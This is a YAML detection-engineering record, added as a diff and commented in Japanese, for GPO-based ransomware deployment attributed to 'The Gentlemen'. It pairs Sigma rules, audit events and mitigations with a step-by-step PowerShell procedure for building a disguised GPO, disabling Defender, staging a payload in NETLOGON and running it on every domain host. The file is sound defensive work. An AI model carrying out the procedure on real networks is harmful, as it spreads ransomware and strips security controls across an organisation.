@@ -1,0 +1,134 @@
+id: ADS-006
+title: "Domain Policy Modification: Group Policy Modification - GPO-based Ransomware Deployment"
+actor: "The Gentlemen"
+aliases:
+  - "Gentleman"
+  - "Gentlemen RaaS"
+  - "Hastalamuerte"
+created: "2026-06-25"
+mitre_technique:
+  id: "T1484.001"
+  name: "Domain Policy Modification: Group Policy Modification"
+  url: "https://attack.mitre.org/techniques/T1484/001"
+platform:
+  - "Windows"
+  - "Active Directory"
+phase: "Defense Evasion / Privilege Escalation"
+
+description: |
+  The Gentlemen はドメインの GPO (グループポリシーオブジェクト) を改ざんし、
+  ドメイン全体のセキュリティコントロールを同時に無効化する。
+  NETLOGON 共有にランサムウェアペイロードをステージングし、
+  GPO のスタートアップスクリプトを使用してドメイン参加全ホストへ一斉展開する。
+
+attack_procedure: |
+  # ステップ 1: 既存 GPO の確認と選定
+  Get-GPO -All | Select-Object DisplayName, Id, GpoStatus
+
+  # ステップ 2: 既存 GPO の改ざん または 新規 GPO 作成
+  # デフォルトドメインポリシーを悪用することが多い
+  New-GPO -Name "Windows Update Policy" -Comment "Legitimate-looking GPO"
+
+  # ステップ 3: GPO でセキュリティコントロールを無効化
+  # Defender を GPO 経由で無効化
+  Set-GPRegistryValue -Name "Windows Update Policy" `
+    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" `
+    -ValueName "DisableAntiSpyware" -Type DWord -Value 1
+
+  # ステップ 4: NETLOGON 共有にランサムウェアペイロードを配置
+  # \\<DC>\NETLOGON\ にランサムウェアバイナリをコピー
+  copy <ransomware.exe> \\<DC_hostname>\NETLOGON\update.exe
+
+  # ステップ 5: GPO スタートアップスクリプトでランサムウェアを実行
+  # すべてのドメイン参加ホストの起動時にペイロードが実行される
+  Set-GPRegistryValue -Name "Windows Update Policy" `
+    -Key "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
+    -ValueName "WindowsUpdate" -Type String -Value "\\<DC>\NETLOGON\update.exe <8-byte-password>"
+
+  # ステップ 6: GPO をドメイン全体にリンク
+  New-GPLink -Name "Windows Update Policy" -Target "DC=domain,DC=local" -LinkEnabled Yes
+
+tools_used:
+  - name: "PowerShell (GroupPolicy モジュール)"
+    description: "GPO の作成・改ざん"
+  - name: "gpupdate.exe"
+    description: "グループポリシーの即時適用"
+
+detection:
+  log_sources:
+    - "Windows Security Event Log (Domain Controller)"
+    - "Microsoft-Windows-GroupPolicy/Operational"
+    - "Sysmon"
+    - "Active Directory 変更監査"
+  expected_events:
+    - "EventID 5136: ディレクトリサービスオブジェクトが変更された (GPO の変更)"
+    - "EventID 5137: ディレクトリサービスオブジェクトが作成された (新規 GPO)"
+    - "EventID 5141: ディレクトリサービスオブジェクトが削除された"
+    - "EventID 4739: ドメインポリシーが変更された"
+    - "Sysmon EventID 11: NETLOGON 共有への新規ファイル作成"
+    - "SYSVOL フォルダへの不審な変更"
+  detection_rule: |
+    title: Suspicious GPO Modification - Potential Ransomware Deployment Preparation
+    id: a1b2c3d4-0006-0006-0006-000000000006
+    status: experimental
+    description: Detects GPO modifications that could be used for domain-wide ransomware deployment
+    logsource:
+      product: windows
+      service: security
+    detection:
+      gpo_modification:
+        EventID: 5136
+        ObjectClass: 'groupPolicyContainer'
+      suspicious_attributes:
+        AttributeLDAPDisplayName|contains:
+          - 'gPCMachineExtensionNames'
+          - 'gPCUserExtensionNames'
+          - 'versionNumber'
+      condition: gpo_modification and suspicious_attributes
+    falsepositives:
+      - Legitimate GPO administration
+    level: high
+    tags:
+      - attack.defense_evasion
+      - attack.privilege_escalation
+      - attack.t1484.001
+
+  additional_detection: |
+    title: Executable Dropped in NETLOGON Share
+    description: Detects new executables placed in NETLOGON share (common in GPO-based ransomware deployment)
+    logsource:
+      product: windows
+      category: file_event
+    detection:
+      selection:
+        TargetFilename|contains: '\NETLOGON\'
+        TargetFilename|endswith:
+          - '.exe'
+          - '.bat'
+          - '.ps1'
+      condition: selection
+    level: critical
+
+  mitigations:
+    - "GPO の変更に対して承認ワークフローを導入"
+    - "SYSVOL/NETLOGON フォルダへのアクセスを最小権限で管理"
+    - "GPO 変更の監査ログを有効化し SIEM で監視"
+    - "特権アカウント (Domain Admin) の多要素認証を強制"
+    - "Tiered Administration モデルの導入でドメイン管理者権限を制限"
+    - "NETLOGON 共有への書き込みを監視・アラート"
+
+ioc:
+  hashes: []
+  file_names:
+    - "README-GENTLEMEN.txt"
+  notes: |
+    NETLOGON 共有への不審な実行ファイルの配置、および正当性のない GPO の作成・変更に注意。
+    The Gentlemen は「Windows Update Policy」のような偽装 GPO 名を使用する可能性がある。
+
+references:
+  - source: "Microsoft Security Blog"
+    url: "https://www.microsoft.com/en-us/security/blog/2026/05/28/the-gentlemen-ransomware-dissecting-a-self-propagating-go-encryptor/"
+  - source: "Trend Micro"
+    url: "https://www.trendmicro.com/en_us/research/25/i/unmasking-the-gentlemen-ransomware.html"
+  - source: "MITRE ATT&CK T1484.001"
+    url: "https://attack.mitre.org/techniques/T1484/001"
